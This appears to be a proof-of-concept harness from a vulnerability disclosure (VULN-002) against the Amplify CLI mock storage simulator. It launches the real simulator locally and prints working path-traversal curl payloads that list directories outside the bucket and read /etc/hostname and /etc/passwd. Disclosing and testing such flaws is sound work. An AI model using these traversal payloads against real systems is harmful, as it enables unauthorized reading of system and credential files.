/**
 * VULN-002 Real Code Harness
 *
 * This imports the ACTUAL compiled AmplifyStorageSimulator from the amplify-cli
 * monorepo — the same code path that `amplify mock storage` uses.
 *
 * Call chain in real CLI:
 *   amplify mock storage
 *     -> amplify-util-mock/src/commands/mock/storage.ts :: run()
 *     -> amplify-util-mock/src/storage/index.ts :: start()
 *     -> amplify-util-mock/src/storage/storage.ts :: StorageTest.start()
 *         constructs: { port: 20005, route: '/<bucketName>-<env>', localDirS3: '<projectPath>/amplify/mock-data/S3/<bucket>' }
 *     -> new AmplifyStorageSimulator(config)   <-- WE START HERE
 *     -> AmplifyStorageSimulator.start()
 *         -> new StorageServer(config).start()
 *             -> express().listen(port)
 *
 * We skip all the Amplify context/meta/plugin plumbing and directly instantiate
 * AmplifyStorageSimulator with the same config shape the CLI would produce.
 */

const path = require('path');
const fs = require('fs-extra');

// Import the REAL compiled class from the monorepo build output
const { AmplifyStorageSimulator } = require(
  '/home/user/poc/repos/amplify-cli/packages/amplify-storage-simulator/lib/index.js'
);

// --- Simulate what StorageTest.start() constructs ---
//
// In the real CLI:
//   bucketName = `${s3UserInputs.bucketName}-${localEnvInfo.envName}`
//   route = path.join('/', bucketName)            -> e.g. "/mybucket-dev"
//   localDirS3 = <projectPath>/amplify/mock-data/S3/<bucketName>
//   port = 20005
//
// We create a local directory to act as the S3 bucket root.

const BUCKET_NAME = 'vuln002-testbucket-dev';
const PORT = 20005;
const LOCAL_DIR = path.join(__dirname, 'mock-data', 'S3', BUCKET_NAME);

// Create the mock bucket directory with a sample file (like a real project would have)
fs.ensureDirSync(LOCAL_DIR);
fs.ensureDirSync(path.join(LOCAL_DIR, 'public'));
fs.writeFileSync(
  path.join(LOCAL_DIR, 'public', 'sample.txt'),
  'This is a legitimate S3 object inside the mock bucket.\n'
);
fs.writeFileSync(
  path.join(LOCAL_DIR, 'public', 'photo.jpg'),
  'fake-image-data\n'
);

// This is EXACTLY the config shape from storage.ts line 62:
//   const storageConfig = { port, route, localDirS3 };
const storageConfig = {
  port: PORT,
  route: path.join('/', BUCKET_NAME),       // "/vuln002-testbucket-dev"
  localDirS3: LOCAL_DIR,                      // the bucket root on disk
};

console.log('='.repeat(72));
console.log('VULN-002: Real AmplifyStorageSimulator Harness');
console.log('='.repeat(72));
console.log('');
console.log('This uses the ACTUAL compiled code from:');
console.log('  amplify-cli/packages/amplify-storage-simulator/lib/');
console.log('');
console.log('Config (same shape as StorageTest.start() produces):');
console.log(JSON.stringify(storageConfig, null, 2));
console.log('');

const simulator = new AmplifyStorageSimulator(storageConfig);

simulator.start().then(() => {
  const bucketAbsolute = path.resolve(LOCAL_DIR);
  const depth = bucketAbsolute.split(path.sep).filter(Boolean).length;
  const traversal = '../'.repeat(depth);

  console.log(`Mock Storage endpoint is running at ${simulator.url}`);
  console.log(`  (same message the real CLI prints at storage.ts:65)`);
  console.log('');
  console.log('Bucket root on disk:', bucketAbsolute);
  console.log('Bucket depth from /:', depth, 'directories');
  console.log('');
  console.log('─'.repeat(72));
  console.log('LEGITIMATE REQUESTS (how the simulator is meant to be used):');
  console.log('─'.repeat(72));
  console.log('');
  console.log('  # Read a file from the bucket');
  console.log(`  curl http://localhost:${PORT}/${BUCKET_NAME}/public/sample.txt`);
  console.log('');
  console.log('  # List objects in the bucket');
  console.log(`  curl "http://localhost:${PORT}/${BUCKET_NAME}/?prefix=public"`);
  console.log('');
  console.log('─'.repeat(72));
  console.log('VULN-002 PATH TRAVERSAL — prefix parameter attack:');
  console.log('─'.repeat(72));
  console.log('');
  console.log('The vulnerable code path:');
  console.log('  1. parseUrl() in utils.ts sets request.params.path = prefix + "/"');
  console.log('  2. S3server.ts handleRequestList() does:');
  console.log('       dirPath = path.join(localDirectoryPath, request.params.path)');
  console.log('  3. globSync("**/*", { cwd: dirPath }) enumerates files');
  console.log('  4. S3server.ts handleRequestGet() does:');
  console.log('       filePath = path.join(localDirectoryPath, request.params.path)');
  console.log('       fs.readFile(filePath, ...) reads and returns the content');
  console.log('');
  console.log('  # LIST /etc/ (directory enumeration outside bucket)');
  console.log(`  curl "http://localhost:${PORT}/${BUCKET_NAME}/?prefix=${traversal}etc"`);
  console.log('');
  console.log('  # LIST / (root filesystem enumeration)');
  console.log(`  curl "http://localhost:${PORT}/${BUCKET_NAME}/?prefix=${traversal.slice(0, -3)}"`);
  console.log('');
  console.log('  # READ /etc/hostname (arbitrary file read)');
  console.log(`  curl "http://localhost:${PORT}/${BUCKET_NAME}/${traversal}etc/hostname"`);
  console.log('');
  console.log('  # READ /etc/passwd');
  console.log(`  curl "http://localhost:${PORT}/${BUCKET_NAME}/${traversal}etc/passwd"`);
  console.log('');
  console.log('─'.repeat(72));
  console.log('The server is running. Try the commands above in another terminal.');
  console.log('Press Ctrl+C to stop.');
  console.log('─'.repeat(72));
}).catch((err) => {
  console.error('Failed to start simulator:', err);
  process.exit(1);
});
